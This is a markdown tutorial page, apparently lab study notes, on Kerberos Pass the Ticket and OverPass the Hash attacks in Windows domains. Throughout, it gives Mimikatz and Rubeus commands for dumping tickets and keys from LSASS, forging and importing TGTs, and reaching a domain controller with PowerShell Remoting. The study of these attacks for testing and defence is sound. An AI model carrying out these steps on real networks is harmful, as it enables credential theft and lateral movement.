---
title: Pass the Ticket (PtT) from Windows
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - lateral
  - movement
---
# Pass the Ticket (PtT) 

In this attack, we use a stolen Kerberos ticket to move laterally. It can be:

- Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
- Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.

## Harvesting Kerberos Tickets from Windows

On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it.

**As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.**

### Mimikatz - Export Tickets

```cmd-session
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit
dir *.kirbi
```

### Rubeus

If running as Local admin it will dump all the tickets. `Rubeus dump`, instead of giving us a file, will print the ticket encoded in base64 format.

```cmd-session
Rubeus.exe dump /nowrap
```


## Forge your own tickets with Pass the Key or OverPass the Hash

The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`.

**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

### Mimikatz  - Pass the Key or OverPass the Hash

It requires administrative rights.

**1.** Get hashes with sekurlsa::ekeys

To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module `sekurlsa::ekeys`. This module will enumerate all key types present for the Kerberos package.

```cmd-session
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using `Mimikatz` and `Rubeus`.

**2.** Pass the Key or OverPass the Hash

```cmd-session
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.

### Rubeus - Pass the Key or OverPass the Hash

It does not require administrative rights.

```cmd-session
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

This is not the case, but if we would want to crack the ticket, we could use [kirbi2john](kirbi2john.md) and hashcat to proceed.

## Pass the Ticket (PtT) with Rubeus

Now that we have some Kerberos tickets, we can use them to move laterally within an environment.

### With /ptt
With `Rubeus` we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag `/ptt` to submit the ticket (TGT or TGS) to the current logon session.

```cmd-session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

### With kirbi file

```cmd-session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

### With kirbi in base64

We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.

Convert .kirbi to Base64 Format: 

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.

```cmd-session
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```


## Pass the Ticket (PtT) with mimikatz

```cmd-session
.\mimikatz.exe 
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

```


## Pass The Ticket with PowerShell Remoting (Windows)

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer.  

Administrators often use PowerShell Remoting to manage remote computers on the network.

Enabling PowerShell Remoting creates both HTTP and HTTPS listeners.

To create a PowerShell Remoting session on a remote computer, you must:
- have administrative permissions, 
- be a member of the Remote Management Users group, 
- or have explicit PowerShell Remoting permissions in your session configuration.

### With mimikatz

```powershell
# To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket
.\mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit

# And then open a PowerShell console and connect to the target machine
powershell
Enter-PSSession -ComputerName DC01
```

### With Rubeus

**1.** Create a Sacrificial Process with Rubeus

Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9).

```cmd-session
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# The command above will open a new cmd window.
```

**2.** Rubeus - Pass the Ticket for Lateral Movement

Execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session:

```cmd-session
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

**3.** Connect to the DC using PowerShell Remoting.

```cmd-session
powershell
Enter-PSSession -ComputerName DC01
```